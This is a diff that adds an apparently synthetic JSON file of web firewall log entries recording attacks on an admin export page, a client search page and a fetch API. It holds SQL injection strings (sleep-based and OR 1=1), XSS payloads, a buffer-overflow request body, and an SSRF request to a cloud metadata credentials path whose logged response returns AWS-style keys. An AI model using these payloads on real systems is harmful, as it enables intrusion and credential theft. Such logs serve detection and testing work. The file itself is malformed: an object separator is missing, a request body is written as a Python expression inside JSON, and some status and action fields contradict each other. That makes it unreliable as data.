@@ -1,0 +1,133 @@
+[
+  {
+    "RayID": "7fa001a1b2c3d4e5",
+    "ClientIP": "185.23.45.67",
+    "Country": "IE",
+    "Method": "GET",
+    "URI": "/rev/admin/export?orderby=(select(0)from(select(sleep(10)))a)",
+    "Status": 503,
+    "Action": "block",
+    "RuleID": "100015",
+    "RuleMessage": "SQL Injection - Time-Based Blind",
+    "Timestamp": "2025-11-09T02:01:00Z",
+    "UserAgent": "Mozilla/5.0 (compatible; CustomBot/1.0)"
+  },
+  {
+    "RayID": "7fa002a1b2c3d4e6",
+    "ClientIP": "193.70.12.88",
+    "Country": "FR",
+    "Method": "GET",
+    "URI": "/rev/admin/export?orderby=' OR '1'='1",
+    "Status": 404,
+    "Action": "block",
+    "RuleID": "100017",
+    "RuleMessage": "SQL Injection - Boolean Logic",
+    "Timestamp": "2025-11-09T02:01:05Z",
+    "UserAgent": "Mozilla/5.0 (compatible; CustomBot/1.0)"
+  },
+  {
+    "RayID": "7fa003a1b2c3d4e7",
+    "ClientIP": "138.68.94.23",
+    "Country": "DE",
+    "Method": "GET",
+    "URI": "/clientes/historico?search=<script>alert('XSS')</script>",
+    "Status": 302,
+    "Action": "challenge",
+    "RuleID": "100020",
+    "RuleMessage": "Cross-Site Scripting - Script Tag",
+    "Timestamp": "2025-11-09T02:01:10Z",
+    "UserAgent": "Mozilla/5.0 (compatible; CustomBot/1.0)",
+    "RedirectURL": "/captcha"
+  },
+  {
+    "RayID": "7fa004a1b2c3d4e8",
+    "ClientIP": "138.68.94.23",
+    "Country": "DE",
+    "Method": "GET",
+    "URI": "/clientes/historico?search=<script>alert('XSS')</script>",
+    "Status": 200,
+    "Action": "block",
+    "RuleID": "100020",
+    "RuleMessage": "Cross-Site Scripting - Script Tag",
+    "Timestamp": "2025-11-09T02:01:15Z",
+    "UserAgent": "Mozilla/5.0 (compatible; CustomBot/1.0)"
+  },
+  {
+    "RayID": "7fa005a1b2c3d4e9",
+    "ClientIP": "45.79.181.101",
+    "Country": "US",
+    "Method": "GET",
+    "URI": "/clientes/historico?search=<img src=x onerror=alert('XSS')>",
+    "Status": 302,
+    "Action": "challenge",
+    "RuleID": "100021",
+    "RuleMessage": "Cross-Site Scripting - Event Handler",
+    "Timestamp": "2025-11-09T02:01:20Z",
+    "UserAgent": "Mozilla/5.0 (compatible; CustomBot/1.0)",
+    "RedirectURL": "/captcha"
+  },
+  {
+    "RayID": "7fa006a1b2c3d4ea",
+    "ClientIP": "45.79.181.101",
+    "Country": "US",
+    "Method": "GET",
+    "URI": "/clientes/historico?search=<img src=x onerror=alert('XSS')>",
+    "Status": 200,
+    "Action": "block",
+    "RuleID": "100021",
+    "RuleMessage": "Cross-Site Scripting - Event Handler",
+    "Timestamp": "2025-11-09T02:01:25Z",
+    "UserAgent": "Mozilla/5.0 (compatible; CustomBot/1.0)"
+  }
+  {
+  "RayID": "7fa207a1b2c3d4eb",
+  "ClientIP": "82.94.76.101",
+  "Country": "NL",
+  "Method": "POST",
+  "URI": "/clientes/consulta",
+  "Status": 503,
+  "Action": "block",
+  "RuleID": "100032",
+  "RuleMessage": "Buffer Overflow - Oversized Payload",
+  "Timestamp": "2025-11-09T02:03:30Z",
+  "UserAgent": "H4ck3rScan/9.9 (ReconTool; stealth-mode)",
+  "Headers": {
+    "X-Forwarded-For": "127.0.0.1",
+    "X-RateLimit-Bypass": "true",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Content-Length": "1048576"
+  },
+  "RequestBody": "input=" + "A" * 500 + "%25%32%35%33%25%32%35%33%25%32%35%33" + "B" * 500 + "%5C%78%34%31%5C%78%34%31%5C%78%34%31" + "C" * 500 + "%u9090%u9090%u9090%u9090" + "D" * 500 + "%00%00%00%00%00%00%00%00"
+}
+
+{
+  "RayID": "7fa401a1b2c3d4ec",
+  "ClientIP": "45.79.181.101",
+  "Country": "US",
+  "Method": "POST",
+  "URI": "/api/fetch",
+  "Status": 200,
+  "Action": "allow",
+  "RuleID": null,
+  "RuleMessage": null,
+  "Timestamp": "2025-11-09T02:05:00Z",
+  "UserAgent": "H4ck3rScan/9.9 (ReconTool; stealth-mode)",
+  "Headers": {
+    "X-Forwarded-For": "127.0.0.1",
+    "X-RateLimit-Bypass": "true",
+    "Content-Type": "application/json"
+  },
+  "RequestBody": {
+    "url": "http://guireversing.com.br/latest/meta-data/iam/security-credentials/"
+  },
+  "ResponseBody": {
+    "Code": "Success",
+    "LastUpdated": "2025-11-09T01:59:00Z",
+    "Type": "AWS-HMAC",
+    "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
+    "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+    "Token": "IQoJb3JpZ2luX2VjE...",
+    "Expiration": "2025-11-09T08:00:00Z"
+  }
+ }
+]
